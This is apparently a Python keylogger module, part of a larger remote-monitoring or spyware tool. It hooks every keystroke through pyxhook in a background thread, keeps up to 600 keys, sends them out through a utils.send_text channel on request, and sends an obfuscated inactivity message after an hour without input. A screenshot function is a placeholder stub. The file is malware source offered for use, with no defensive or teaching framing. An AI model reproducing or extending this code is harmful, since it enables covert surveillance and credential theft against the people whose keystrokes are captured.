import time
from threading import Thread
import pyxhook
import utils


def screenshot():
    # TODO: This
    utils.send_img("https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fwww.theeastnashvillian.com%2Fwp-content%2Fuploads%2F2020%2F07%2FPlaceholder-template-image-1.jpg&f=1&nofb=1")


# =========================
keys = []
last_press = 0

def key_press(e):
    # If the length is over 600 then simpy remove the first one
    # to prevent the list from getting too big
    if len(keys) >= 600:
        keys.pop(0)

    # Add the key to the list
    keys.append(e.Key)

    # If there was no keypress in the last our
    if int(time.time()) - last_press > 3600:
        # Send a mesasge
        utils.send_text(utils.decypher("Lxwcjlc an-nwpjpnm.", 91581751751))


def init_strokes():
    global last_press
    last_press = time.time()

    # Instantiate the hook manager
    hk = pyxhook.HookManager()
    # Define some "settings"
    hk.KeyDown = key_press
    hk.HookKeyboard()

    try:
        # Start the hook manager
        hk.start()
    except:
        pass


def init_keylogger():
    # Create the thread
    thr = Thread(target=init_strokes)
    thr.start()


def keylogger(n):
    # Send the selected keys
    utils.send_text(" ".join(keys[len(keys)-n:]))
    # Empty the list
    keys.clear()
    